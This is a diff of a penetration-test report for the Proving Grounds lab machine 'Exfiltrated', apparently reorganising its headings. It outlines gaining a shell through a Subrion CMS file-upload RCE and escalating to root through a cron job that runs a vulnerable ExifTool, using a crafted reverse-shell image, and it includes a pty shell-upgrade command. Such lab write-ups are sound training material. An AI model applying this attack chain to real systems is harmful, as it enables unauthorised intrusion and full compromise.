@@ -1,5 +1,15 @@
 # Report-Exfiltrated
 
+## Engagement Overview
+
+Laboratory: Offensive Security Proving Grounds
+
+Target Name: Exfiltrated
+
+Target IP Address: 192.168.132.163
+
+Operating System: Linux
+
 ## Information Gathering:
 
 Full Nmap scan of all ports:
@@ -72,12 +82,10 @@ Proof of concept Code:https://github.com/hev0x/CVE-2018-19422-SubrionCMS-RCE
 
 Vulnerability Exploited: SubrionCMS 4.2.1 Authenticated Remote Code Execution (CVE-2018-19422)
 
-System Vulnerable: 192.168.132.163
-
 Vulnerability Explanation: /panel/uploads in Subrion CMS 4.2.1 allows remote attackers to execute arbitrary PHP code via a .pht or .phar file, because the .htaccess file omits these.
 
 
-### Confirming Arbitrary File Upload:
+### Exploitation:
 
 
 Command:
@@ -103,6 +111,11 @@ python3 -c 'import pty;pty.spawn("/bin/bash")'
 
 ## Privilege Escalation
 
+Vulnerability Exploited: ExifTool 12.23 - Arbitrary Code Execution (CVE-2021-22204)
+
+Vulnerability Explanation:  improper neutralization of user data in the DjVu file format in ExifTool versions 7.44 and up allows arbitrary code execution when parsing the malicious image
+
+### Enumeration:
 
 During local enumeration, a cron job running as root was identified:
 ```
@@ -121,15 +134,12 @@ The script was observed invoking ExifTool to process image files.
 
 Exiftool has a CVE: https://www.exploit-db.com/exploits/50911
 
-Vulnerability Exploited: ExifTool 12.23 - Arbitrary Code Execution (CVE-2021-22204)
 
-System Vulnerable: 192.168.132.163
-
-Vulnerability Explanation:  improper neutralization of user data in the DjVu file format in ExifTool versions 7.44 and up allows arbitrary code execution when parsing the malicious image
 
 
 <img width="1064" height="364" alt="Pasted image 20260119141150" src="https://github.com/user-attachments/assets/3dd84ffb-5a30-4606-a72f-3ef8b59b9503" />
 
+### Exploitation:
 
 The comand created image.jpg with a reverse shell.
 ```bash
